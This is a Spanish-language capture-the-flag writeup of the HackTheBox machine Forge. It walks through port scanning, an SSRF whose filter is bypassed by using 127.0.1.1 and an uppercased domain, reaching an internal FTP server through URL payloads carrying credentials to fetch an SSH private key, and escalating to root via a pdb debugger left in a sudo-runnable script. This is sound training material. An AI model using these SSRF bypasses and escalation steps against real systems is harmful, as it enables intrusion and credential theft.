---
layout: post
title: Forge - Writeup
permalink: /htb/forge
tags: [Hackthebox, Linux, Medium, SSRF, Python, Web, FTP]
description: Máquina Linux de dificultad Media en la que explotaremos un SSRF para acceder a un FTP interno y obtener la clave privada de un usuario para conectarnos como este por SSH. Por último, nos aprovecharemos de un error en un archivo Python que podemos ejecutar como root para ejecutar comandos como este usuario mediante la consola de Depuración de Python.
categories: [Linux, Ciberseguridad]
---

<p align="center">
    <img src="/img/forge/Forge.png">
</p>

Máquina Linux de dificultad Media en la que explotaremos un SSRF para acceder a un FTP interno y obtener la clave privada de un usuario para conectarnos como este por SSH. Por último, nos aprovecharemos de un error en un archivo Python que podemos ejecutar como root para ejecutar comandos como este usuario mediante la consola de Depuración de Python.

<br>

# Índice

- [Reconocimiento](#1)
  - [Escaneo de puertos con nmap](#11)
- [Enumeración](#2)
  - [Enumerando el servicio web que corre en el puerto 80](#21)
    - [Explorando un campo de subida de archivos](#211)
    - [Descubrimiento de rutas y subdominios con wfuzz](#212)
    - [Explorando un campo de subida de imágenes por URL](#213)
- [Explotación](#3)
  - [Explotando una vulnerabilidad de tipo SSRF](#31)
  - [Accediendo a un subdominio mediante el SSRF](#32)
  - [Accediendo a un servidor FTP interno](#33)
- [Escalada de privilegios](#4)

<br>

# Reconocimiento<a id=1></a>

## Escaneo de puertos con nmap<a id=12></a>

Empezamos con un escaneo de puertos usando la herramienta `nmap`:

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn 10.10.11.111 -oG ports
...
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
...
```

```bash
$ nmap -p22,80 -sCV -n -vvv 10.10.11.111 -oN s
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
...
```

Bien, tenemos varias cosillas:

- En el puerto 22 corre SSH
- En el puerto 80 corre un servidor Apache
- El Apache nos redirige a `http://forge.htb`, por lo tanto, parece que se está aplicando `VirtualHosting`.

Añadimos el dominio al fichero `/etc/hosts`:

```bash
$ echo '10.10.11.111 forge.htb' >> /etc/hosts
```

<br>

# Enumeración<a id=2></a>

## Enumerando el servicio web que corre en el puerto 80<a id=21></a>

Vamos a lanzarle un `whatweb` a ver si a primera vista vemos algo interesante...

```bash
$ whatweb forge.htb
http://forge.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.111], Title[Gallery]
```

Lo único que vemos es que, al parecer, se trata de una galería. Vamos a verlo:

![](/img/forge/2022-01-20-16-50-08.png)

Efectivamente, es un galería. Lo más llamativo a primera vista es la opción de poder subir una imagen (Arriba a la derecha). Vamos a ver que hay...

![](/img/forge/2022-01-20-16-51-35.png)

Vemos dos cosas interesantes: Un campo de subida de archivos y lo que parece ser una opción para cargar una imagen por URL. Vamos a explorar el campo de subida de archivos:

### Explorando un campo de subida de archivos<a id=211></a>

Podemos lograr subir un archivo PHP, pero, a la hora de cargarlo en el navegador, vemos que carga como si fuese una imagen. Vamos a ver que vemos con curl:

![](/img/forge/2022-01-20-16-55-12.png)

Vemos que lo podemos subir, pero no logramos que se interprete como código PHP. Vamos a tratar de cambiarle el `content-type`...

...

Si le echamos un vistazo con Burpsuite, vemos que el `content-type` no parece afectar... más bien parece que carga así por como está montado el Servidor. Vamos a ver lo de las URL...

### Descubrimiento de rutas y subdominios con wfuzz<a id=212></a>

Antes de seguir, vamos a enumerar un poco el sitio...

```bash
$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-[22/22]
txt -t 200 --hc 404 http://forge.htb/FUZZ
...
000000150:   301        3 L      24 W       224 Ch "uploads"                   
000000255:   301        9 L      28 W       307 Ch "static"                    
000000352:   200        32 L     58 W       929 Ch "upload"                                                  
000095510:   403        9 L      28 W       274 Ch "server-status"
...
```

```bash
$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-me[6/6]
txt -t 200 --hc 404,302 -H 'Host: FUZZ.forge.htb' http://forge.htb
...
000000245:   200        1 L      4 W        27 Ch "admin"
...
```

Nada nuevo... Excepto el subdominio que la herramienta `wfuzz` ha encontrado! Nos lo añadimos al fichero `/etc/hosts` y vamos a echarle un ojo...

![](/img/forge/2022-01-20-17-09-18.png)

Aparentemente, solo `localhost` parece poder acceder. Eso nos hace recordar que existe un campo que aparentemente nos permite subir una imagen por URL. Vamos a verlo...

### Explorando un campo de subida de imágenes por URL<a id=213></a>

Como ya sabemos, las máquinas de HTB no salen a Internet (Solo son accesibles vía VPN). Por lo tanto, si se emitiese una petición por parte del servidor a por ejemplo `google.com`, no encontraría el dominio, Vamos a verlo:

![](/img/forge/2022-01-20-17-14-21.png)

Efectivamente, `urlib3`... Vamos a verificarlo...

Nos ponemos en escucha:

```bash
$ nc -nlvp 1111
```

![](/img/forge/2022-01-20-17-19-56.png)

<br>

# Explotación<a id=3></a>

## Explotando una vulnerabilidad de tipo SSRF<a id=31></a>

Bien. Confirmamos que emite petición! Podemos tratar de abusar de esto para descubrir puertos internos y acceder a sus servicios mediante un `SSRF`.

> Una vulnerabilidad SSRF (`Server Side Request Forgery`) es un tipo de vulnerabilidad que permite a un atacante forzar al servidor a realizar una petición a otro servidor, ya sea un servidor tercero, o a sí mismo. Si un campo de este tipo no está bien sanitizado, podemos tratar de que el servidor se envíe peticiones a sí mismo, pudiendo evadir ciertas reglas de Firewall y/o del Router para acceder a servicios internos que, sin la ayuda de esto, no podríamos. 

Vamos a ver si podemos llegar a ver algún servicio interno:

![](/img/forge/2022-01-20-17-31-15.png)

Vemos que nos lo bloquea... Vamos a probar vías alternativas...

...

La dirección `127.0.1.1` parece funcionar.

![](/img/forge/2022-01-20-17-38-02.png)

Si recordamos bien, el subdominio que hemos obtenido antes (`admin.forge.htb`) solo es accesible por `localhost`. Vamos a ver que podemos hacer:

## Accediendo a un subdominio mediante el SSRF<a id=32></a>

Si intentamos acceder directamente, vemos que nos bloquea...

![](/img/forge/2022-01-20-17-44-00.png)

Vamos a tratar de bypassearlo como hemos hecho antes:

...

Vemos que es `KeySensitive`, es decir, que es sensible a mayúsculas/minúsculas!

![](/img/forge/2022-01-20-17-47-09.png)

Si entramos a la URL directamente desde el navegador, no veremos nada, pero si le lanzamos una petición por CURL...

![](/img/forge/2022-01-20-17-48-29.png)

Estamos dentro, y tenemos dos rutas!

- `/announcements`
- `/upload`

Vamos a ver que hay en `announcements`:

![](/img/forge/2022-01-20-17-51-14.png)

Vemos que hay un anuncio que nos dice que han preparado un servidor FTP con un usuario cuyas credenciales son `user:heightofsecurity123!`.  También nos dicen que podemos acceder a el via HTTP mediante `/upload`, mediante el parámetro GET `u`. Vamos a echarle un vistazo:

## Accediendo a un servidor FTP interno<a id=33></a>

Si le pasamos la siguiente URL y miramos la URL que nos devuelve con CURL, podremos ver que efectivamente nos conecta:

```
http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@127.0.1.1
```

![](/img/forge/2022-01-20-18-02-03.png)

Si tratamos de acceder a la flag...

![](/img/forge/2022-01-20-18-03-14.png)

Que la flag sea válida nos da a pensar en que podríamos estar en el `home` de un usuario del sistema. En vista de que el puerto 22 corre un SSH, vamos a ver si existe una clave privada dentro de este directorio.

```
http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa
```

![](/img/forge/2022-01-20-18-05-51.png)

Tenemos la clave. Vamos a tratar de usarla para ganar acceso a la máquina...

La metemos en un archivo y...

```bash
$ chmod 600 id_rsa
```

![](/img/forge/2022-01-20-18-08-58.png)

> Si tenemos una clave privada válida, pero no para el usuario que corresponde, esta no nos servirá para iniciar sesión. En este caso, si no se reutilizase el username del FTP, lo tendríamos más difícil...

<br>

# Escalada de privilegios<a id=4></a>

Vamos a enumerar el sistema...

...

```bash
$ sudo -l
...
User 'user' may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Podemos ejecutar ese script como el usuario root. Vamos a ver que contiene y si tenemos permisos de edición:

```bash
$ ls -l /opt/remote-manage.py
-rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py
```

Tenemos permisos de lectura pero no de ejecución. Vamos a ver el código...

```python
#!/usr/bin/env python3                                             
import socket     
import random                                                      
import subprocess                                                  
import pdb                                                         
                                                                                                                                      
port = random.randint(1025, 65535)           
                                 
try:                                                               
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))                  
    sock.listen(1)                                                 
    print(f'Listening on localhost:{port}')                 
    (clientsock, addr) = sock.accept()    
    clientsock.send(b'Enter the secret passsword: ')   
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')                                                                                         
    else:                    
        clientsock.send(b'Welcome admin!\n')                                                                                          
        while True:          
            clientsock.send(b'\nWhat do you wanna do: \n')                                                                            
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:                                        
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

Parece ser un pequeño servidor para obtener información del sistema de manera remota. Lo más llamativo es que casi al final, llama a `pdb` (`python debugger`), con la cual podríamos ejecutar código. Esta solo se llamará cuando se detecte un error dentro del `try:`. Si nos fijamos bien, podemos hacerlo fácilmente si en vez de un número le pasamos una cadena de caracteres.

> El error está en la línea: `option = int(clientsock.recv(1024).strip())`. Esto sucede ya que intenta convertir una cadena de caracteres (strings) a un número entero (int), lo cual en este lenguaje de programación, no es posible de la forma empleada en el archivo en cuestión.

Nos ejecutamos el script como el usuario root:

```bash
$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:62292
```

> El puerto es aleatorio.

Nos abrimos otra conexión por SSH y nos conectamos al servidor:

```bash
$ nc localhost 62292
```

Ponemos la contraseña (Está hardcodeada en el código del archivo) y le mandamos cualquier cosa que no pueda ser convertida a un número entero:

![](/img/forge/2022-01-20-18-27-49.png)

Una vez estemos dentro de `pdb`, podemos ejecutar código Python:

![](/img/forge/2022-01-20-18-29-19.png)

Ponemos lo siguiente para ejecutar un comando a nivel de sistema:

![](/img/forge/2022-01-20-18-31-50.png)

Y ya estaría! 😋

-----------

<center>Thanks for reading!</center>
